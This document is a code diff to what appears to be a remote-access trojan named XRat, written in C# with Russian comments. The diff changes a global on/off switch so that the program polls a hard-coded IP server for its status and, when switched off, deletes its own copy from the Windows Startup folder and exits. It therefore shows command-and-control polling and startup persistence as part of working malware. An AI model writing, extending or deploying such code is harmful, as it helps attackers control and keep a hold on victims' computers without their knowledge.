@@ -244,28 +244,93 @@ namespace XRat
             }
         }
 
-        public static async Task<bool> Validable()
+        public static async Task<string> Validable()
         {
-            return bool.Parse(await ParseCodeFromRawLink("https://raw.githubusercontent.com/UndefinedClear/XRatGlobalSettings/refs/heads/main/ControlXRatGlobaActivity.txt"));    
+            try
+            {
+                // Логируем URL и попытку получения данных
+                Console.WriteLine("Получаем данные с URL...");
+                return await ParseTextFromRawLink("http://95.31.8.49:5000/xrat/xratactivity");
+            }
+            catch (Exception ex)
+            {
+                // Логируем ошибку при вызове Validable
+                Console.WriteLine($"Ошибка при вызове Validable: {ex.Message}");
+                return string.Empty;
+            }
         }
 
         public static async Task ControlXRatGlobaActivity()
         {
-            if (!await Validable())
+            try
             {
-                string username = ProCMD("whoami").output;
-                username = username.Split('\\')[1];
+                // Получаем статус глобальной активности
+                string valid = await Validable();
+                Console.WriteLine($"Полученное значение: '{valid}'");
 
-                string autostart_path = $"""C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\test.exe""";
-                string command = "del " + autostart_path;
-
-                if (ProCMD(command).success)
+                if (string.IsNullOrEmpty(valid))
                 {
+                    Console.WriteLine("Получено пустое значение.");
+                    return;
+                }
+
+                if (valid == "false")
+                {
+                    Console.WriteLine("Globally off");
+
+                    string username = ProCMD("whoami").output;
+                    username = username.Split('\\')[1];
+
+                    string autostartPath = $@"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{Settings.filename + ".exe"}";
+                    string command = $"del \"{autostartPath}\"";  // Используем кавычки для корректной работы с путями
+
+                    // Проверяем успешность выполнения команды
+                    if (ProCMD(command).success)
+                    {
+                        Console.WriteLine("Success");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Failed");
+                    }
+
+                    // Завершаем выполнение программы (можно заменить на корректный выход)
                     Environment.Exit(0);
                 }
                 else
                 {
-                    Environment.Exit(1);
+                    Console.WriteLine("Globally on");
+                }
+            }
+            catch (Exception ex)
+            {
+                // Логируем ошибку и выводим сообщение
+                Console.WriteLine($"Ошибка в ControlXRatGlobaActivity: {ex.Message}");
+            }
+        }
+
+        public static async Task<string> ParseTextFromRawLink(string url)
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                try
+                {
+                    // Получаем HTML-контент страницы
+                    Console.WriteLine($"Получаем данные с URL: {url}");
+                    string htmlContent = await client.GetStringAsync(url);
+
+                    // Логируем полученные данные (например, первые 500 символов)
+                    Console.WriteLine($"Полученные данные:\n{htmlContent.Substring(0, Math.Min(500, htmlContent.Length))}");
+
+                    return htmlContent.Substring(0, Math.Min(500, htmlContent.Length));
+                }
+                catch (Exception ex)
+                {
+                    // Логируем ошибку
+                    Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");
+
+                    // Возвращаем пустую строку в случае ошибки
+                    return string.Empty;
                 }
             }
         }
@@ -277,7 +342,11 @@ namespace XRat
                 try
                 {
                     // Получаем HTML-контент страницы
+                    Console.WriteLine($"Получаем данные с URL: {url}");
                     string htmlContent = await client.GetStringAsync(url);
+
+                    // Логируем полученные данные (например, первые 500 символов)
+                    Console.WriteLine($"Полученные данные:\n{htmlContent.Substring(0, Math.Min(500, htmlContent.Length))}");
 
                     // Создаем объект HtmlDocument для парсинга HTML
                     var htmlDocument = new HtmlDocument();
@@ -289,18 +358,20 @@ namespace XRat
                     // Если теги <pre> найдены, возвращаем содержимое первого
                     if (preTags != null && preTags.Count > 0)
                     {
+                        Console.WriteLine("Тег <pre> найден, возвращаем данные.");
                         return preTags[0].InnerText; // Возвращаем текст первого тега <pre>
                     }
                     else
                     {
-                        // Если теги <pre> не найдены, возвращаем пустую строку
+                        // Если теги <pre> не найдены, выводим информацию и возвращаем пустую строку
+                        Console.WriteLine("Теги <pre> не найдены.");
                         return string.Empty;
                     }
                 }
                 catch (Exception ex)
                 {
                     // Логируем ошибку
-                    // Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");
+                    Console.WriteLine($"Произошла ошибка при скачивании или парсинге страницы: {ex.Message}");
 
                     // Возвращаем пустую строку в случае ошибки
                     return string.Empty;
